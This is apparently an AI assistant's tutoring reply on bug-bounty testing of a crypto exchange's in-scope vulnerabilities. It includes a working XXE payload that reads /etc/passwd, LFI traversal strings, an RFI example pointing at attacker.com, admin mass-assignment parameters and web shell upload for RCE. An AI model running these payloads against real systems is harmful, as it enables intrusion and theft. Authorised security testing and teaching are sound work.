@@ -1,0 +1,108 @@
+Let’s finish up the remaining items on the IN SCOPE VULNERABILITIES list to complete your full training syllabus. We have already covered IDOR, Race Conditions (Business Logic), SSRF, SQLi, XSS, and Directory Traversal.
+Here are the remaining deep-dive concepts: XXE, File Inclusions (LFI/RFI), Privilege Escalation, CSRF, Sensitive Information Leakage, and Remote Code Execution (RCE).
+
+🚀 Module 6: XML External Entity (XXE) Injection
+
+Part of Injection Vulnerabilities (SQL, XXE)
+
+1. The Concept
+
+XXE happens when an application parses XML input but allows the XML document to define "External Entities." An entity in XML is like a shortcut variable. If the XML parser is poorly configured, an attacker can define a variable that points to a local file on the server or an internal network URL, and the server will fetch it.
+
+2. The Crypto / Exchange Context
+
+Many financial services and payment gateways handle data transfers using XML formats (such as SAML for Single Sign-On or SOAP APIs).
+• Where to look: Look for endpoints that accept Content-Type: application/xml or text/xml. Even if an endpoint uses JSON, try changing the header to XML and sending an XML payload to see if the backend accepts it.
+
+3. How to Test Manually
+
+If you find an endpoint processing XML, you inject a malicious DOCTYPE declaration at the top of your request:
+xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<user>
+  <username>&xxe;</username>
+  <password>password123</password>
+</user>
+Use code with caution.
+If the server processes this and reflects the contents of the /etc/passwd file back to you in the response, it is a critical XXE vulnerability.
+
+🚀 Module 7: File Inclusions (Local & Remote)
+
+
+1. The Concept
+
+File Inclusion occurs when an application passes a file path or URL to an execution statement (like include() or require() in PHP).
+• Local File Inclusion (LFI): Similar to Directory Traversal, but instead of just reading the file, the server actually executes the code inside that file.
+• Remote File Inclusion (RFI): The application allows you to pass an entire external web link (e.g., ?page=https://attacker.com), forcing the server to download and execute code hosted on your machine.
+
+2. How to Test Manually
+
+Look for parameters loading dynamic views or templates:
+• GET /index.php?page=welcome
+• LFI Test: Change welcome to ../../../../etc/passwd or log files to achieve code execution.
+• RFI Test: Change welcome to https://githubusercontent.com and see if the server loads your external file content.
+
+🚀 Module 8: Privilege Escalation
+
+Part of Access Control Issues
+
+1. The Concept
+
+Privilege escalation happens when a user can expand their rights beyond what they are authorized to hold.
+• Horizontal Escalation: Accessing resources belonging to a peer user (this is what IDOR handles).
+• Vertical Escalation: Exceeding your user level entirely (e.g., upgrading a standard trader account to a platform Administrator account).
+
+2. The Crypto Context
+
+On OFZA, look for hidden administrative parameters inside user registration, profile updates, or settings requests.
+• Where to look: When saving your profile, look at the JSON body parameters.
+• How to test: Try injecting admin parameters that shouldn't be there, like:
+{"username":"trader1", "role":"user", "is_admin": true} or {"tier": 1, "is_staff": 1}. If the server saves your profile and suddenly gives you access to a /dashboard/admin panel, you have achieved vertical escalation.
+
+🚀 Module 9: Cross-Site Request Forgery (CSRF)
+
+
+1. The Concept
+
+CSRF is an attack that forces an end-user to execute unwanted actions on a web application in which they are currently authenticated. It relies entirely on the fact that browsers automatically attach session cookies to requests made to a site.
+
+2. The Crypto Context
+
+If OFZA handles critical user state changes via standard HTTP requests without strict anti-CSRF protections (like unique anti-CSRF tokens or SameSite=Strict cookies), an attacker can create a trap website.
+• The Scenario: An attacker hosts a malicious page containing a hidden form targeting https://ofza.com. If a logged-in OFZA user visits the attacker's trap page, the page automatically submits the form. The victim's browser attaches their valid OFZA session cookie, and the exchange processes the unauthorized transaction.
+• Note: The program rules state that CSRF on anonymous forms (like contact forms) or Logout functions are out of scope. Focus exclusively on authenticated actions like changing security settings, passwords, or updating profiles.
+
+🚀 Module 10: Leakage of Sensitive Information
+
+
+1. The Concept
+
+Information leakage happens when a site reveals sensitive data to an unauthorized user—often through verbose error logging, exposed debug screens, or metadata buried in source code.
+
+2. The Crypto Context / Testing Guidance
+
+• What is In-Scope: Leaking system configuration secrets, private API keys belonging to the company, or cleartext customer PII (Personally Identifiable Information like passport scans, phone numbers, full addresses).
+• What is Out-of-Scope: The rules explicitly state that Descriptive error messages (e.g., Stack Traces) and Moderately Sensitive Information Disclosure are excluded. Do not submit basic server errors. Focus purely on leaks that lead to severe, clear business/financial asset loss.
+
+👑 The Final Boss: Remote Code Execution (RCE)
+
+
+1. The Concept
+
+RCE is the ultimate critical bug. It occurs when an attacker can execute arbitrary operating system commands directly on the host server.
+
+2. Where to Look on a Modern Platform
+
+RCE rarely happens via basic input fields anymore. It is typically discovered through:
+• Flawed File Uploads: Uploading a profile picture but tricking the server into accepting a web shell (like a .php, .jsp, or .py file) and then accessing its URL to run system commands.
+• Vulnerable Dependencies: Exploiting outdated third-party libraries running on the server backend (like the infamous Log4j flaw). Note: The rules state that a simple report saying software is out-of-date without a Proof of Concept is out of scope. You must prove impact.
+
+🏆 Complete Knowledge Base Unlocked
+
+You now have a complete understanding of the entire scope of the OFZA security program. You can confidently navigate the application, recognizing exactly what vulnerabilities matter to their team and how to responsibly test for them.
+Now that you have the complete map of in-scope vulnerabilities:
+• Which of these remaining bugs (XXE, Privilege Escalation, or CSRF) do you find most interesting?
+• Would you like me to show you a generic example of a CSRF POC template or an XML payload structure to keep in your testing notes?
